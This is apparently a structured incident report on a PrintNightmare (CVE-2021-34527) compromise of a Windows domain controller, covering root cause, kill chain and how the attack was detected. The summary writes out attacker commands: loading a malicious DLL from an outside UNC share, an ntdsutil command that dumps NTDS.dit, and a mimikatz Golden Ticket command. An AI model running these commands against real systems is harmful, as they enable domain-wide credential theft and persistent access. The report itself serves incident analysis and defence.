  opening: An attacker exploited the PrintNightmare vulnerability (CVE-2021-34527) in the Windows Print Spooler service to achieve remote code execution as SYSTEM on a Windows Server 2019 domain controller (DC-03, 10.10.1.12). The vulnerability exists in the RpcAddPrinterDriverEx function, which allows an authenticated user to load arbitrary DLLs as SYSTEM via the printer driver installation path.
  summary: 'An attacker exploited the PrintNightmare vulnerability (CVE-2021-34527) in the Windows Print Spooler service to achieve remote code execution as SYSTEM on a Windows Server 2019 domain controller (DC-03, 10.10.1.12). The vulnerability exists in the RpcAddPrinterDriverEx function, which allows an authenticated user to load arbitrary DLLs as SYSTEM via the printer driver installation path. The attacker used the public PoC to upload a malicious DLL (printui.dll, SHA256: 4c8a...) to a UNC path (\\198.51.100.42\share\printui.dll), then triggered the Print Spooler to load it via: rundll32.exe printui.dll,EntryPoint achieving SYSTEM privileges. From the domain controller, the attacker dumped the NTDS.dit database using ntdsutil.exe (ntdsutil ''activate instance ntds'' ''ifm'' ''create full C:\temp\ntds'' quit quit), extracted all domain credentials (4,200 accounts), and created a Golden Ticket using the krbtgt hash (mimikatz ''kerberos::golden /user:Administrator /domain:corp.local /sid:...
    /krbtgt:<hash> /ptt''). The exploit was possible because the Print Spooler service was running on the DC (despite no printing requirements) and had not been patched for CVE-2021-34527. The attack was detected when Microsoft Defender for Identity flagged the NTDS.dit access attempt and the Print Spooler service crashed and restarted (a known side effect of the exploit).'
  compromised_assets:
  - DC-03 (10.10.1.12) — Windows Server 2019 domain controller
  - NTDS.dit database (all 4,200 domain credentials extracted)
  - Print Spooler service (exploited for SYSTEM RCE)
  - 'KRBTGT hash (Golden Ticket enablement: b1607d7b...)'
  - Malicious DLL on UNC path (\\198.51.100.42\share\printui.dll)
  detected_via: Microsoft Defender for Identity alert (NTDS.dit access from Print Spooler process); Print Spooler crash/restart anomaly (Event ID 7034); NTDS.dit access from unusual process
  kill_chain:
  - Print Spooler service identified as running on DC-03
  - Malicious DLL uploaded via UNC path (\\198.51.100.42\share\printui.dll)
  - RpcAddPrinterDriverEx exploited for SYSTEM RCE
  - NTDS.dit dumped using ntdsutil.exe (C:\temp\ntds)
  - All 4,200 domain credentials extracted
